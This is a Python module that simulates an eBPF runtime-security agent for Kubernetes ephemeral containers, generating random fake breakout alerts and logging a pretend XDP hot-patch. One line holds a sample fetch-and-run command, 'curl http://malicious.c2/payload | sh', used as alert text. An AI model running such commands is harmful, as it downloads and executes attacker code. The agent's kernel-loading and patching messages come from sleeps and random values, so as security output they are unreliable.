"""
Netrunner eBPF Runtime Security — Container & Ephemeral Pod monitoring.

This module simulates an eBPF agent that hooks into tracepoint/syscalls/sys_enter_execve
to monitor process execution inside Kubernetes ephemeral containers.
"""

import asyncio
import time
import random
from backend.core.logger import log as logger
from backend.core.db import insert_alert, load_nodes_db


class EBPFRuntimeAgent:
    def __init__(self):
        self.running = False
        self.monitored_cgroups = set()

    async def start(self):
        self.running = True
        logger.info("[eBPF] Attaching tracepoint/syscalls/sys_enter_execve hook...")
        await asyncio.sleep(1)
        logger.info("[eBPF] Successfully loaded BPF program into kernel.")

        while self.running:
            await self._simulate_ebpf_ringbuffer()
            await asyncio.sleep(5)

    async def stop(self):
        self.running = False
        logger.info("[eBPF] Unloading BPF program from kernel.")

    async def _simulate_ebpf_ringbuffer(self):
        """
        Polls the simulated eBPF ring buffer for syscall events.
        In a real scenario, this reads from a memory-mapped BPF ring/perf buffer.
        """
        # We simulate a 5% chance of an ephemeral container attack occurring
        if random.random() < 0.05:
            await self._trigger_ephemeral_container_alert()

    async def _trigger_ephemeral_container_alert(self):
        # We fetch active nodes to find a target
        nodes = await load_nodes_db()
        targets = [n for n in nodes.values() if "Cloud" in n.get("type", "")]
        if not targets:
            targets = list(nodes.values())
            if not targets:
                return

        target = random.choice(targets)

        # Simulate malicious payload executing inside a Kubernetes ephemeral container
        cgroup_id = f"kubepods-burstable-pod{random.randint(1000,9999)}.slice"
        pid = random.randint(30000, 60000)
        command = "/bin/bash -c 'curl http://malicious.c2/payload | sh'"

        alert_id = f"alert_ebpf_{int(time.time())}"

        logger.warning(
            f"[eBPF] 🚨 ANOMALY DETECTED: Execve syscall in ephemeral namespace! cgroup={cgroup_id} cmd={command}"
        )

        alert = {
            "id": alert_id,
            "title": "Ephemeral Container Breakout Attempt",
            "description": f"eBPF Kernel Sensor detected an interactive shell execution (`{command}`) originating from a newly attached Kubernetes ephemeral container (cgroup: {cgroup_id}, PID: {pid}). This indicates an adversary abusing debugging features for lateral movement.",
            "severity": "critical",
            "status": "new",
            "created_at": time.time(),
            "updated_at": time.time(),
            "target_node": target["id"],
        }

        await insert_alert(alert)

    async def deploy_hot_patch(self, cve_id: str, signature: str):
        """
        Deploys an eBPF XDP filter to drop malicious packets matching a zero-day signature,
        effectively hot-patching the kernel without requiring a restart.
        """
        logger.critical(
            f"[eBPF-AEGIS] Compiling XDP Hot-Patch for {cve_id} (Signature: {signature})..."
        )
        await asyncio.sleep(0.5)  # Simulate compilation delay
        logger.critical(f"[eBPF-AEGIS] Loading XDP program into kernel network stack.")
        await asyncio.sleep(0.2)
        logger.critical(
            f"[eBPF-AEGIS] 🛡️ HOT-PATCH DEPLOYED. Malicious packets will be dropped at layer 3/4."
        )
        return True


# Global singleton
ebpf_agent = EBPFRuntimeAgent()


async def start_ebpf_agent():
    await ebpf_agent.start()
